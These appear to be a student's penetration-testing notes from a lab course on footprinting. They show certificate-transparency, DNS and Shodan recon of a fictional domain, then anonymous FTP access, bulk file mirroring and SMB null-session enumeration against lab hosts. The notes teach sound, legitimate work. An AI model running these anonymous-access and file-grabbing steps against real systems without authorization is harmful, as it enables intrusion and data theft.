# Foot Printing

&#x20;1\. Certificate Transparency (crt.sh) Tracking

**Command:**

Bash

```
curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq .
```

**Output:**

JSON

```
[  
  {    
    "issuer_ca_id": 23451835427,    
    "issuer_name": "C=US, O=Let's Encrypt, CN=R3",    
    "common_name": "matomo.inlanefreight.com",    
    "name_value": "matomo.inlanefreight.com",    
    "id": 50815783237226155,    
    "entry_timestamp": "2021-08-21T06:00:17.173",    
    "not_before": "2021-08-21T05:00:16",    
    "not_after": "2021-11-19T05:00:15",    
    "serial_number": "03abe9017d6de5eda90"  
  },  
  {    
    "issuer_ca_id": 6864563267,    
    "issuer_name": "C=US, O=Let's Encrypt, CN=R3",    
    "common_name": "matomo.inlanefreight.com",    
    "name_value": "matomo.inlanefreight.com",    
    "id": 5081529377,    
    "entry_timestamp": "2021-08-21T06:00:16.932",    
    "not_before": "2021-08-21T05:00:16",    
    "not_after": "2021-11-19T05:00:15",    
    "serial_number": "03abe90104e271c98a90"  
  },  
  {    
    "issuer_ca_id": 113123452,    
    "issuer_name": "C=US, O=Let's Encrypt, CN=R3",    
    "common_name": "smartfactory.inlanefreight.com",    
    "name_value": "smartfactory.inlanefreight.com",    
    "id": 4941235512141012357,    
    "entry_timestamp": "2021-07-27T00:32:48.071",    
    "not_before": "2021-07-26T23:32:47",    
    "not_after": "2021-10-24T23:32:45",    
    "serial_number": "044bac5fcc4d59329ecbbe9043dd9d5d0878"  
  },  
  { ... SNIP ... }
]
```

**Command:**

Bash

```
curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u
```

**Output:**

Plaintext

```
account.ttn.inlanefreight.com
blog.inlanefreight.com
bots.inlanefreight.com
console.ttn.inlanefreight.com
ct.inlanefreight.com
data.ttn.inlanefreight.com
*.inlanefreight.com
inlanefreight.com
integrations.ttn.inlanefreight.com
iot.inlanefreight.com
mails.inlanefreight.com
marina.inlanefreight.com
marina-live.inlanefreight.com
matomo.inlanefreight.com
next.inlanefreight.com
noc.ttn.inlanefreight.com
preview.inlanefreight.com
shop.inlanefreight.com
smartfactory.inlanefreight.com
ttn.inlanefreight.com
vx.inlanefreight.com
www.inlanefreight.com
```

#### 2. Subdomain & Host Discovery

**Command:**

Bash

```
for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4;done
```

**Output:**

Plaintext

```
blog.inlanefreight.com 10.129.24.93
inlanefreight.com 10.129.27.33
matomo.inlanefreight.com 10.129.127.22
www.inlanefreight.com 10.129.127.33
s3-website-us-west-2.amazonaws.com 10.129.95.250
```

#### 3. Shodan Threat Intelligence Tracking

**Command:**

Bash

```
for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f4 >> ip-addresses.txt;done
for i in $(cat ip-addresses.txt);do shodan host $i;done
```

**Output:**

Plaintext

```
10.129.24.93
City:                    Berlin
Country:                 Germany
Organization:            InlaneFreight
Updated:                 2021-09-01T09:02:11.370085
Number of open ports:    2
Ports:     80/tcp nginx     443/tcp nginx     

10.129.27.33
City:                    Berlin
Country:                 Germany
Organization:            InlaneFreight
Updated:                 2021-08-30T22:25:31.572717
Number of open ports:    3
Ports:     22/tcp OpenSSH (7.6p1 Ubuntu-4ubuntu0.3)     80/tcp nginx     443/tcp nginx         
        |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, -TLSv1.3, TLSv1.2
        |-- Diffie-Hellman Parameters:
                Bits:          2048
                Generator:     2                

10.129.27.22
City:                    Berlin
Country:                 Germany
Organization:            InlaneFreight
Updated:                 2021-09-01T15:39:55.446281
Number of open ports:    8
Ports:     25/tcp          
          |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, TLSv1.2, TLSv1.3     
     53/tcp       
     53/udp       
     80/tcp Apache httpd      
     81/tcp Apache httpd     
     110/tcp          
          |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, TLSv1.2    
     111/tcp      
     443/tcp Apache httpd         
          |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, TLSv1.2, TLSv1.3        
          |-- Diffie-Hellman Parameters:                
                Bits:          2048                
                Generator:     2                
                Fingerprint:   RFC3526/Oakley Group 14    
     444/tcp          

10.129.27.33
City:                    Berlin
Country:                 Germany
Organization:            InlaneFreight
Updated:                 2021-08-30T22:25:31.572717
Number of open ports:    3
Ports:     22/tcp OpenSSH (7.6p1 Ubuntu-4ubuntu0.3)     80/tcp nginx     443/tcp nginx         
        |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, -TLSv1.3, TLSv1.2
        |-- Diffie-Hellman Parameters:
                Bits:          2048
                Generator:     2
```

#### 4. DNS Reconnaissance

**Command:**

Bash

```
dig any inlanefreight.com
```

**Output:**

Plaintext

```
; <<>> DiG 9.16.1-Ubuntu <<>> any inlanefreight.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 52058
;; flags: qr rd ra; QUERY: 1, ANSWER: 17, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;inlanefreight.com.             IN      ANY

;; ANSWER SECTION:
inlanefreight.com.      300     IN      A       10.129.27.33
inlanefreight.com.      300     IN      A       10.129.95.250
inlanefreight.com.      3600    IN      MX      1 aspmx.l.google.com.
inlanefreight.com.      3600    IN      MX      10 aspmx2.googlemail.com.
inlanefreight.com.      3600    IN      MX      10 aspmx3.googlemail.com.
inlanefreight.com.      3600    IN      MX      5 alt1.aspmx.l.google.com.
inlanefreight.com.      3600    IN      MX      5 alt2.aspmx.l.google.com.
inlanefreight.com.      21600   IN      NS      ns.inwx.net.
inlanefreight.com.      21600   IN      NS      ns2.inwx.net.
inlanefreight.com.      21600   IN      NS      ns3.inwx.eu.
inlanefreight.com.      3600    IN      TXT     "MS=ms92346782372"
inlanefreight.com.      21600   IN      TXT     "atlassian-domain-verification=IJdXMt1rKCy68JFszSdCKVpwPN"
inlanefreight.com.      3600    IN      TXT     "google-site-verification=O7zV5-xFh_jn7JQ31"
inlanefreight.com.      300     IN      TXT     "google-site-verification=bow47-er9LdgoUeah"
inlanefreight.com.      3600    IN      TXT     "google-site-verification=gZsCG-BINLopf4hr2"
inlanefreight.com.      3600    IN      TXT     "logmein-verification-code=87123gff5a479e-61d4325gddkbvc1-b2bnfghfsed1-3c789427sdjirew63fc"
inlanefreight.com.      300     IN      TXT     "v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.24.8 ip4:10.129.27.2 ip4:10.72.82.106 ~all"
inlanefreight.com.      21600   IN      SOA     ns.inwx.net. hostmaster.inwx.net. 2021072600 10800 3600 604800 3600

;; Query time: 332 msec
;; SERVER: 127.0.0.53#53(127.0.0.53)
;; WHEN: Mi Sep 01 18:27:22 CEST 2021
;; MSG SIZE  rcvd: 940
```

#### 1. Install vsFTDP Server

Bash

```
sudo apt install vsftpd
```

_(No output provided in text—installs the package)_

#### 2. View vsFTPd Configuration (Filtering out Comments)

Bash

```
cat /etc/vsftpd.conf | grep -v "#"
```

**Output:**

Plaintext

```
listen=NO
listen_ipv6=YES
anonymous_enable=NO
local_enable=YES
dirmessage_enable=YES
use_localtime=YES
xferlog_enable=YES
connect_from_port_20=YES
secure_chroot_dir=/var/run/vsftpd/empty
pam_service_name=vsftpd
rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem
rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key
ssl_enable=NO
```

#### 3. Check Denied FTP Users File

Bash

```
cat /etc/ftpusers
```

**Output:**

Plaintext

```
guest
john
kevin
```

#### 4. Connect via Standard FTP Client (Anonymous Login)

Bash

```
ftp 10.129.14.136
```

_(Inside the prompt, the user enters `anonymous` and runs `ls`)_ **Output:**

Plaintext

```
Connected to 10.129.14.136.
220 "Welcome to the HTB Academy vsFTP service."
Name (10.129.14.136:cry0l1t3): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Clients
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt
226 Directory send OK.
```

#### 5. Check FTP Connection Status

Bash

```
ftp> status
```

**Output:**

Plaintext

```
Connected to 10.129.14.136.
No proxy connection.
Connecting using address family: any.
Mode: stream; Type: binary; Form: non-print; Structure: file
Verbose: on; Bell: off; Prompting: on; Globbing: on
Store unique: off; Receive unique: off
Case: off; CR stripping: on
Quote control characters: on
Ntrans: off
Nmap: off
Hash mark printing: off; Use of PORT cmds: on
Tick counter printing: off
```

#### 6. Run FTP with Debugging and Packet Tracing

Bash

```
ftp> debug
ftp> trace
ftp> ls
```

**Output:**

Plaintext

```
Debugging on (debug=1).
Packet tracing on.
---> PORT 10,10,14,4,188,195
200 PORT command successful. Consider using PASV.
---> LIST
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 1002     1002         4096 Sep 14 17:03 Clients
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt
226 Directory send OK.
```

#### 7. Directory Listing with Hidden IDs Feature Activated

Bash

```
ftp> ls
```

**Output:**

Plaintext

```
---> TYPE A
200 Switching to ASCII mode.
ftp: setsockopt (ignored): Permission denied
---> PORT 10,10,14,4,223,101
200 PORT command successful. Consider using PASV.
---> LIST
150 Here comes the directory listing.
-rw-rw-r--    1 ftp     ftp      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 ftp     ftp         4096 Sep 14 17:03 Clients
drwxrwxr-x    2 ftp     ftp         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 ftp     ftp         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 ftp     ftp           41 Sep 14 16:45 Important Notes.txt
-rw-------    1 ftp     ftp            0 Sep 15 14:57 testupload.txt
226 Directory send OK.
```

#### 8. Recursive Directory Listing

Bash

```
ftp> ls -R
```

**Output:**

Plaintext

```
---> PORT 10,10,14,4,222,149
200 PORT command successful. Consider using PASV.
---> LIST -R
150 Here comes the directory listing.
.:
-rw-rw-r--    1 ftp      ftp      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 ftp      ftp         4096 Sep 14 17:03 Clients
drwxrwxr-x    2 ftp      ftp         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 ftp      ftp         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 ftp      ftp           41 Sep 14 16:45 Important Notes.txt
-rw-------    1 ftp      ftp            0 Sep 15 14:57 testupload.txt

./Clients:
drwx------    2 ftp      ftp          4096 Sep 16 18:04 HackTheBox
drwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:00 Inlanefreight

./Clients/HackTheBox:
-rw-r--r--    1 ftp      ftp         34872 Sep 16 18:04 appointments.xlsx
-rw-r--r--    1 ftp      ftp        498123 Sep 16 18:04 contract.docx
-rw-r--r--    1 ftp      ftp        478237 Sep 16 18:04 contract.pdf
-rw-r--r--    1 ftp      ftp           348 Sep 16 18:04 meetings.txt

./Clients/Inlanefreight:
-rw-r--r--    1 ftp      ftp         14211 Sep 16 18:00 appointments.xlsx
-rw-r--r--    1 ftp      ftp         37882 Sep 16 17:58 contract.docx
-rw-r--r--    1 ftp      ftp            89 Sep 16 17:58 meetings.txt
-rw-r--r--    1 ftp      ftp        483293 Sep 16 17:59 proposal.pptx

./Documents:
-rw-r--r--    1 ftp      ftp         23211 Sep 16 18:05 appointments-template.xlsx
-rw-r--r--    1 ftp      ftp         32521 Sep 16 18:05 contract-template.docx
-rw-r--r--    1 ftp      ftp        453312 Sep 16 18:05 contract-template.pdf

./Employees:
226 Directory send OK.
```

#### 9. Download a Single File and Verify Locally

Bash

```
ftp> get Important\ Notes.txt
ftp> exit
Umedh@htb[/htb]$ ls | grep Notes.txt
```

**Output:**

Plaintext

```
local: Important Notes.txt remote: Important Notes.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Important Notes.txt (41 bytes).
226 Transfer complete.
41 bytes received in 0.00 secs (606.6525 kB/s)
221 Goodbye.
'Important Notes.txt'
```

#### 10. Download All Available Files Recursively via wget

Bash

```
Umedh@htb[/htb]$ wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
```

**Output:**

Plaintext

```
--2021-09-19 14:45:58--  ftp://anonymous:*password*@10.129.14.136/
           => ‘10.129.14.136/.listing’
Connecting to 10.129.14.136:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PORT ... done.    ==> LIST ... done.
12.12.1.136/.listing           [ <=>                                  ]     466  --.-KB/s    in 0s
2021-09-19 14:45:58 (65,8 MB/s) - ‘10.129.14.136/.listing’ saved [466]
--2021-09-19 14:45:58--  ftp://anonymous:*password*@10.129.14.136/Calendar.pptx
           => ‘10.129.14.136/Calendar.pptx’
==> CWD not required.
==> SIZE Calendar.pptx ... done.
==> PORT ... done.    ==> RETR Calendar.pptx ... done.
...SNIP...
2021-09-19 14:45:58 (48,3 MB/s) - ‘10.129.14.136/Employees/.listing’ saved [119]
FINISHED --2021-09-19 14:45:58--
Total wall clock time: 0,03s
Downloaded: 15 files, 1,7K in 0,001s (3,02 MB/s)
```

#### 11. Inspect Downloaded Folder Structure Locally

Bash

```
Umedh@htb[/htb]$ tree .
```

**Output:**

Plaintext

```
.
└── 10.129.14.136
    ├── Calendar.pptx
    ├── Clients
    │   └── Inlanefreight
    │       ├── appointments.xlsx
    │       ├── contract.docx
    │       ├── meetings.txt
    │       └── proposal.pptx
    ├── Documents
    │   ├── appointments-template.xlsx
    │   ├── contract-template.docx
    │   └── contract-template.pdf
    ├── Employees
    └── Important Notes.txt

5 directories, 9 files
```

#### 12. Create a Local File for Upload Testing

Bash

```
Umedh@htb[/htb]$ touch testupload.txt
```

_(No output)_

#### 13. Upload File to Server

Bash

```
ftp> put testupload.txt
ftp> ls
```

**Output:**

Plaintext

```
local: testupload.txt remote: testupload.txt
---> PORT 10,10,14,4,184,33
200 PORT command successful. Consider using PASV.
---> STOR testupload.txt
150 Ok to send data.
226 Transfer complete.
---> TYPE A
200 Switching to ASCII mode.
---> PORT 10,10,14,4,223,101
200 PORT command successful. Consider using PASV.
---> LIST
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 1002     1002         4096 Sep 14 17:03 Clients
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt
-rw-------    1 1002     133             0 Sep 15 14:57 testupload.txt
226 Directory send OK.
```

#### 14. Update Nmap Scripting Engine Database

Bash

```
sudo nmap --script-updatedb
```

**Output:**

Plaintext

```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 13:49 CEST
NSE: Updating rule database.
NSE: Script Database updated successfully.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.28 seconds
```

#### 15. Find FTP-Specific Nmap Scripts on Disk

Bash

```
find / -type f -name ftp* 2>/dev/null | grep scripts
```

**Output:**

Plaintext

```
/usr/share/nmap/scripts/ftp-syst.nse
/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse
/usr/share/nmap/scripts/ftp-proftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-bounce.nse
/usr/share/nmap/scripts/ftp-libopie.nse
/usr/share/nmap/scripts/ftp-anon.nse
/usr/share/nmap/scripts/ftp-brute.nse
```

#### 16. Scan Target Using Nmap with Default FTP Scripts Enabled

Bash

```
sudo nmap -sV -p21 -sC -A 10.129.14.136
```

**Output:**

Plaintext

```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-16 18:12 CEST
Nmap scan report for 10.129.14.136
Host is up (0.00013s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxrwxrwx    1 ftp      ftp       8138592 Sep 16 17:24 Calendar.pptx [NSE: writeable]
| drwxrwxrwx    4 ftp      ftp          4096 Sep 16 17:57 Clients [NSE: writeable]
| drwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:05 Documents [NSE: writeable]
| drwxrwxrwx    2 ftp      ftp          4096 Sep 16 17:24 Employees [NSE: writeable]
| -rwxrwxrwx    1 ftp      ftp            41 Sep 16 17:24 Important Notes.txt [NSE: writeable]
|_-rwxrwxrwx    1 ftp      ftp             0 Sep 15 14:57 testupload.txt [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
```

#### 17. Run Nmap FTP Scan with Script Trace Option

Bash

```
sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace
```

**Output:**

Plaintext

```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 13:54 CEST                                                                                                                                                   
NSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 8 [10.129.14.136:21]                                   
NSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 16 [10.129.14.136:21]             
NSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 24 [10.129.14.136:21]
NSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 32 [10.129.14.136:21]
NSOCK INFO [11.4640s] nsock_read(): Read request from IOD #1 [10.129.14.136:21] (timeout: 7000ms) EID 42
NSOCK INFO [11.4640s] nsock_read(): Read request from IOD #2 [10.129.14.136:21] (timeout: 9000ms) EID 50
NSOCK INFO [11.4640s] nsock_read(): Read request from IOD #3 [10.129.14.136:21] (timeout: 7000ms) EID 58
NSOCK INFO [11.4640s] nsock_read(): Read request from IOD #4 [10.129.14.136:21] (timeout: 11000ms) EID 66
NSE: TCP 10.10.14.4:54226 > 10.129.14.136:21 | CONNECT
NSE: TCP 10.10.14.4:54228 > 10.129.14.136:21 | CONNECT
NSE: TCP 10.10.14.4:54230 > 10.129.14.136:21 | CONNECT
NSE: TCP 10.10.14.4:54232 > 10.129.14.136:21 | CONNECT
NSOCK INFO [11.4660s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 50 [10.129.14.136:21] (41 bytes): 220 Welcome to HTB-Academy FTP service...
NSOCK INFO [11.4660s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 58 [10.129.14.136:21] (41 bytes): 220 Welcome to HTB-Academy FTP service...
NSE: TCP 10.10.14.4:54228 < 10.129.14.136:21 | 220 Welcome to HTB-Academy FTP service.
```

#### 18 & 19. Netcat and Telnet Interaction Examples

Bash

```
nc -nv 10.129.14.136 21
telnet 10.129.14.136 21
```

_(Used as baseline interaction variants without extended outputs shown in text)_

#### 20. Establish an Encrypted Connection to FTP Server Using OpenSSL

Bash

```
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```

**Output:**

Plaintext

```
CONNECTED(00000003)                                                                                      
Can't use SSL_get_servername                        
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
verify error:num=18:self signed certificate
verify return:1
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
verify return:1
---                                                 
Certificate chain 
 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
   i:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
--- 
Server certificate
-----BEGIN CERTIFICATE-----
MIIENTCCAx2gAwIBAgIUD+SlFZAWzX5yLs2q3ZcfdsRQqMYwDQYJKoZIhvcNAQEL
...SNIP...
```

### 🔒 What is OpenSSL?

**OpenSSL** is a robust, commercial-grade, full-featured cryptographic toolkit that implements the **TLS (Transport Layer Security)** and **SSL (Secure Sockets Layer)** protocols. It is an open-source library used by operating systems, web servers, and application platforms globally to encrypt network traffic and manage digital security certificates.

As an offensive security specialist, you use OpenSSL's command-line tool (specifically `openssl s_client`) to programmatically connect to, audit, and interact with encrypted services to view exposed certificate data (which often leaks internal hostnames, corporate structures, locations, and staff emails).

### 🔀 The Difference Between OpenSSL and FTP

They are fundamentally entirely different classes of technologies that can be configured to work together:

#### 1. Architectural Layer

* **FTP (File Transfer Protocol):** Is a dedicated **Application Layer** network protocol. Its sole function is to facilitate the uploading, downloading, and organization of remote server file directories.
* **OpenSSL:** Is a **Transport/Cryptographic Toolkit**. It does not care about files or directory layouts. Its only job is to handle encryption algorithms, verify digital identity certificates, and execute cryptographic security handshakes.

#### 2. Encryption Capabilities

* **Traditional FTP:** Is completely **unencrypted (clear-text)**. By default, it sends all session commands, server status codes, usernames, passwords, and raw file bytes over the network as plain readable text. Anyone running a packet capture utility (like Wireshark) on the same path can easily intercept the session.
* **OpenSSL:** Is built exclusively **to enforce strong encryption**. It utilizes Asymmetric (Public/Private key pairs) and Symmetric encryption architectures to ensure that network data remains completely unintelligible to eavesdroppers.

#### 3. How They Interact (FTPS)

When an enterprise hardens their file storage, they transition plain FTP into **FTPS (FTP over Explicit TLS/SSL)**.

* If you attempt to use a standard legacy `ftp` terminal client to link to an FTPS server, the client will fail because it does not know how to parse certificates or read encrypted server payloads.
* By using the command **`openssl s_client -connect <IP>:21 -starttls ftp`**, OpenSSL initiates a secure, encrypted tunnel first by passing a `STARTTLS` negotiation down to port 21. Once the secure cryptographic highway is safely constructed by OpenSSL, you can cleanly type standard FTP commands inside that protected session.

| **Commands** | **Description**                                                                                                                        |
| ------------ | -------------------------------------------------------------------------------------------------------------------------------------- |
| `connect`    | Sets the remote host, and optionally the port, for file transfers.                                                                     |
| `get`        | Transfers a file or set of files from the remote host to the local host.                                                               |
| `put`        | Transfers a file or set of files from the local host onto the remote host.                                                             |
| `quit`       | Exits tftp.                                                                                                                            |
| `status`     | Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on. |
| `verbose`    | Turns verbose mode, which displays additional information during file transfer, on or off.                                             |

***

***

## SMB

### 1. Local Configuration & Service Management

#### Filtered View of Samba Configuration

Bash

```
cat /etc/samba/smb.conf | grep -v "#\|\;"
```

* **About the Tools:** \* `cat` (Concatenate): Outputs the contents of a file to the terminal.
  * `grep` (Global Regular Expression Print): A pattern-matching engine used here to filter out unwanted lines.
* **Command Breakdown:**
  * `|` (Pipe): Takes the standard output of the left command and passes it as standard input to the right command.
  * `-v`: Inverts the match (displays lines that **do not** contain the pattern).
  * `"#\|\;"`: A regular expression matching lines starting with comment characters `#` or `;`.
* **Output:**

Code snippet

```
   workgroup = DEV.INFREIGHT.HTB
   server string = DEVSMB
   log file = /var/log/samba/log.%m
   max log size = 1000
   logging = file
   panic action = /usr/share/samba/panic-action %d
   server role = standalone server
   obey pam restrictions = yes
   unix password sync = yes
   passwd program = /usr/bin/passwd %u
   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .
   pam password change = yes
   map to guest = bad user
   usershare allow guests = yes
[printers]
   comment = All Printers
   browseable = no
   path = /var/spool/samba
   printable = yes
   guest ok = no
   read only = yes
   create mask = 0700
[print$]
   comment = Printer Drivers
   path = /var/lib/samba/printers
   browseable = yes
   read only = yes
   guest ok = no
```

#### Restarting the Samba Service

Bash

```
sudo systemctl restart smbd
```

* **About the Tool:** `systemctl` is the central utility for controlling the `systemd` init system and managing background services (daemons) in Linux.
* **Command Breakdown:**
  * `sudo`: Executes the command with root/administrative privileges.
  * `restart`: Stops and immediately starts the service.
  * `smbd`: The specific Samba daemon responsible for handling SMB file-sharing and printing services.
* **Output:** _(None - successful execution returns a blank prompt)_

### 2. Interactive SMB Client (`smbclient`)

`smbclient` is an FTP-like client that allows you to talk directly to an SMB server, list shares, change directories, and download files.

#### Listing Shares via Null Session

Bash

```
smbclient -N -L //10.129.14.128
```

* **Command Breakdown:**
  * `-N`: Activates a **null session** (no password prompt, completely anonymous).
  * `-L`: Lists the available shares on the target host.
  * `//10.129.14.128`: The target server IP address.
* **Output:**

Plaintext

```
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        home            Disk      INFREIGHT Samba
        dev             Disk      DEVenv
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled -- no workgroup available
```

#### Connecting to a Specific Share

Bash

```
smbclient //10.129.14.128/notes
```

* **Command Breakdown:** Maps into the specific active share directory (`/notes`) instead of just querying the root server.
* **Output and Internal Session Execution:**

Plaintext

```
Enter WORKGROUP\<username>'s password: Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup         blocksize      cancel         case_sensitive cd             chmod          chown          close          del            deltree        dir            du             echo           exit           get            getfacl        geteas         hardlink       help           history        iosize         lcd            link           lock           lowercase      ls             l              mask           md             mget           mkdir          more           mput           newer          notify         open           posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    posix_unlink   posix_whoami   print          prompt         put            pwd            q              queue          quit           readlink       rd             recurse        reget          rename         reput          rm             rmdir          showacls       setea          setmode        scopy          stat           symlink        tar            tarmode        timeout        translate      unlock         volume         vuid           wdel           logon          listconnect    showconnect    tcon           tdis           tid            utimes         logoff         ..             !            
smb: \> ls
  .                                   D        0  Wed Sep 22 18:17:51 2021
  ..                                  D        0  Wed Sep 22 12:03:59 2021
  prep-prod.txt                       N       71  Sun Sep 19 15:45:21 2021

                30313412 blocks of size 1024. 16480084 blocks available
```

#### Exfiltrating Files & Local Execution

Plaintext

```
smb: \> get prep-prod.txt
smb: \> !ls
smb: \> !cat prep-prod.txt
```

* **Command Breakdown:**
  * `get`: Downloads the targeted file from the remote SMB share to your local directory.
  * `!`: Escapes the SMB client context to run a command directly on your local host system without dropping the SMB connection.
* **Output:**

Plaintext

```
getting file \prep-prod.txt of size 71 as prep-prod.txt (8,7 KiloBytes/sec) (average 8,7 KiloBytes/sec)
prep-prod.txt
[] check your code with the templates
[] run code-assessment.py
[] …
```

### 3. Administrative Monitoring (`smbstatus`)

Bash

```
smbstatus
```

* **About the Tool:** `smbstatus` is an administrative command-line utility that reports on current connections to a local Samba server.
* **Output:**

Plaintext

```
Samba version 4.11.6-Ubuntu
PID     Username     Group        Machine                                   Protocol Version  Encryption           Signing              
----------------------------------------------------------------------------------------------------------------------------------------
75691   sambauser    samba        10.10.14.4 (ipv4:10.10.14.4:45564)      SMB3_11           -                    -                    

Service      pid     Machine       Connected at                     Encryption   Signing     
---------------------------------------------------------------------------------------------
notes        75691   10.10.14.4   Do Sep 23 00:12:06 2021 CEST     -            -           
No locked files
```

### 4. Port Scanning & Script Auditing (`nmap`)

Bash

```
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

* **About the Tool:** `nmap` (Network Mapper) is an open-source tool used for network discovery and vulnerability auditing.
* **Command Breakdown:**
  * `-sV`: Probes open ports to determine service and version information.
  * `-sC`: Runs a default set of safe discovery scripts via the Nmap Scripting Engine (NSE).
  * `-p139,445`: Restricts scanning exclusively to ports 139 (NetBIOS) and 445 (SMB over TCP).
* **Output:**

Plaintext

```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
Nmap scan report for sharing.inlanefreight.htb (10.129.14.128)
Host is up (0.00024s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 00:00:00:00:00:00 (VMware)

Host script results:
|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-19T13:16:04
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.35 seconds
```

### 5. Low-Level MS-RPC Interaction (`rpcclient`)

`rpcclient` is an engine built to execute client-side MS-RPC functions. It can extract internal server data that standard tools fail to see.

#### Establishing the Connection

Bash

```
rpcclient -U "" 10.129.14.128
```

* **Command Breakdown:**
  * `-U ""`: Passes a completely blank username to force an unauthenticated RPC session connection.

#### Internal Queries Executed inside `rpcclient $>`

Below are the manual queries sent during the session and what they pull back:

* `srvinfo`: Pulls basic server platform and OS metadata.
* `enumdomains`: Enumerates all known domains deployed on the target network architecture.
